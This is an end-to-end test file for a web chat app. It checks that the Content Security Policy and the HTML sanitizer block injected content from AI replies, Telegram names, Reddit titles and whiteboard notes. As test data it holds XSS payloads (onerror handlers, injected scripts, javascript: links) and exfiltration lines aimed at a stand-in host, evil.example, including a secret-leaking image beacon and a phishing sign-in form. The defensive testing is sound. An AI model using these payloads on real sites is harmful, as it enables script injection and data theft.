// End-to-end: what words from outside (an AI reply, a Telegram name, a Reddit title, a note on the whiteboard) can't do
// in the real page. The page's policy keeps scripts to this helper; the sanitizer keeps replies from loading or sending
// anything; texts that are shown are text.
//   npm run test:e2e
const { test, describe, before, after } = require("node:test");
const assert = require("node:assert");
const crypto = require("node:crypto");
const fs = require("node:fs");
const { launch, sleep } = require("../../scripts/lib/harness");

const hasChrome = ["/usr/bin/google-chrome", "/usr/bin/google-chrome-stable", "/usr/bin/chromium", "/usr/bin/chromium-browser", process.env.CHROME_PATH].some((p) => p && fs.existsSync(p));

describe("Words from outside can't take over the page", { skip: !hasChrome && "no Chrome found" }, () => {
  let h;
  let page;
  const problems = [];

  before(async () => {
    h = await launch();
    page = h.page;
    page.on("pageerror", (e) => problems.push(`page error: ${e.message}`));
    // A policy that is too tight shows up as console errors ("Refused to …"): nothing the app itself does may cause one
    page.on("console", (m) => m.type() === "error" && /Content Security Policy|Refused to/.test(m.text()) && problems.push(`console: ${m.text()}`));
    await h.addLocalBrain();
    await h.setLook({ width: 1280 });
  });

  after(async () => {
    await h?.close();
  });

  test("the page comes with a policy: scripts from the helper only, the import map by its hash, no outside forms", async () => {
    const res = await fetch(h.base + "/");
    const csp = res.headers.get("content-security-policy");
    assert.ok(csp, "there is one");
    const html = await res.text();
    const inline = [...html.matchAll(/<script(?![^>]*\ssrc=)[^>]*>([\s\S]*?)<\/script>/gi)].map((m) => `'sha256-${crypto.createHash("sha256").update(m[1]).digest("base64")}'`);
    assert.ok(inline.length >= 1);
    for (const hash of inline) assert.ok(csp.includes(hash), "the page's own inline script is allowed by its hash");
    assert.ok(!/'unsafe-(inline|eval)'/.test(csp));
    assert.match(csp, /script-src 'self'/);
    assert.match(csp, /object-src 'none'/);
    assert.match(csp, /base-uri 'none'/);
    assert.match(csp, /form-action 'self'/);
    assert.match(csp, /frame-ancestors 'none'/);
    assert.ok(!(await fetch(h.base + "/api/settings")).headers.get("content-security-policy"), "only the page has one");
  });

  test("the app itself works under it, with no refusals", async () => {
    // The chat (with code, math and a diagram), the board, voice mode and the robot's room all start without a refusal
    await page.type("#composer-input", "Show me code, math and a diagram");
    await page.keyboard.press("Enter");
    await page.waitForFunction(() => document.querySelector(".msg.model .msg-body")?.innerText.length > 40, { timeout: 20000 });
    await sleep(2500);
    assert.ok(await page.$(".msg.model .math-block, .msg.model .katex"), "math is drawn");
    await page.evaluate(() => (location.hash = "#whiteboard"));
    await sleep(800);
    await page.evaluate(() => document.getElementById("nav-home").click());
    await sleep(300);
    assert.deepStrictEqual(problems, []);
  });

  test("a script that gets into the page doesn't run, whether written in or loaded from elsewhere", async () => {
    const result = await page.evaluate(async () => {
      const violations = [];
      document.addEventListener("securitypolicyviolation", (e) => violations.push(e.violatedDirective));
      document.body.insertAdjacentHTML("beforeend", '<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="window.__pwn=1">');
      const s = document.createElement("script");
      s.textContent = "window.__pwn = 2";
      document.body.append(s);
      const outside = document.createElement("script");
      outside.src = "https://www.gstatic.com.evil.example/x.js";
      document.body.append(outside);
      // Code made from a string (what an injected script would use) is not run either; a timer fires outside this call
      window.setTimeout("window.__fromString = 1", 10);
      await new Promise((r) => setTimeout(r, 400));
      return { pwn: window.__pwn, violations, evalWorked: window.__fromString === 1 };
    });
    assert.strictEqual(result.pwn, undefined, "nothing ran");
    assert.ok(result.violations.length >= 2, `the browser refused them (${result.violations.join(", ")})`);
    assert.strictEqual(result.evalWorked, false);
  });

  test("what an AI reply may contain: formatted text, links, math, task lists. Nothing that loads, sends or restyles", async () => {
    const out = await page.evaluate(async () => {
      const { cleanHtml } = await import("/js/sanitize.js");
      const bad = [
        '<img src="https://evil.example/t.gif?secret=1">',
        '<p style="background:url(https://evil.example/x)">styled</p>',
        '<p style="background:u\\72l(https://evil.example/x)">escaped</p>',
        "<style>body{background:url(https://evil.example)}</style>",
        '<form action="https://evil.example"><input name=pw><button>Sign in</button></form>',
        '<video src="https://evil.example/v.mp4" autoplay></video>',
        '<audio src="https://evil.example/a.mp3"></audio>',
        '<iframe src="https://evil.example"></iframe>',
        '<a href="javascript:alert(1)">x</a>',
        '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
        '<p onclick="alert(1)">x</p>',
        '<link rel="stylesheet" href="https://evil.example/x.css">',
        '<meta http-equiv="refresh" content="0;url=https://evil.example">',
        '<object data="https://evil.example"></object>',
      ].map((html) => cleanHtml(html));
      const good = cleanHtml('<h2>Title</h2><p><strong>bold</strong> <a href="https://example.com/a">link</a></p><ul><li><input type="checkbox" disabled checked> done</li></ul><span style="height:0.6em;vertical-align:-0.1em">m</span><table><tr><td>cell</td></tr></table>');
      const holder = document.createElement("div");
      holder.innerHTML = good;
      const a = holder.querySelector("a");
      return { bad, good, target: a?.target, rel: a?.rel, checkbox: Boolean(holder.querySelector("input[type=checkbox]")), style: holder.querySelector("span")?.getAttribute("style") };
    });
    const joined = out.bad.join("\n");
    assert.ok(!/<(img|style|form|video|audio|iframe|link|meta|object|button)\b/i.test(joined), joined);
    assert.ok(!/url\s*\(|u\\72l|javascript:|onclick|evil\.example/i.test(joined.replace(/<a href="https:\/\/evil[^"]*"/g, "")), joined);
    assert.match(out.good, /<h2>Title<\/h2>/);
    assert.strictEqual(out.target, "_blank");
    assert.match(out.rel, /noopener/);
    assert.strictEqual(out.checkbox, true, "task lists keep their boxes");
    assert.match(out.style, /vertical-align/, "math keeps the sizes it needs");
  });

  test("a name on Telegram, a Reddit title or a spoken line is shown as text", async () => {
    const out = await page.evaluate(async () => {
      document.getElementById("robot-dock-caption")?.removeAttribute("hidden");
      const subs = await import("/js/subtitles.js");
      subs.showDockCaption('<img src=x onerror="window.__pwn=3">Who', '<img src=x onerror="window.__pwn=4"><b>said</b>', false);
      await new Promise((r) => setTimeout(r, 200));
      const box = document.getElementById("robot-dock-caption");
      return { images: box?.querySelectorAll("img, b").length ?? -1, text: box?.textContent ?? "", pwn: window.__pwn };
    });
    assert.strictEqual(out.images, 0, "no markup was made from it");
    assert.match(out.text, /<img src=x/, "it is shown as the characters it is");
    assert.strictEqual(out.pwn, undefined);
  });

  test("a note on the whiteboard is only ever drawn", async () => {
    const whiteboard = require("../../server/whiteboard");
    whiteboard.apply(whiteboard.current().id, [{ op: "add", item: { type: "text", text: '<img src=x onerror="window.__pwn=5"><script>window.__pwn=6</script>', x: 100, y: 100 } }], { actor: "ai", batch: "sec" });
    await page.evaluate(() => (location.hash = "#whiteboard"));
    await sleep(1200);
    assert.strictEqual(await page.evaluate(() => window.__pwn), undefined);
    assert.strictEqual(await page.$("#wb-workspace img[src='x']"), null);
  });

  test("nothing was refused that the app needs", () => {
    // The refusals the tests above caused on purpose are the only ones allowed
    const unexpected = problems.filter((p) => !/gstatic\.com\.evil|inline script|unsafe-eval|'script-src'|script-src-elem|script-src-attr/.test(p));
    assert.deepStrictEqual(unexpected, []);
  });
});
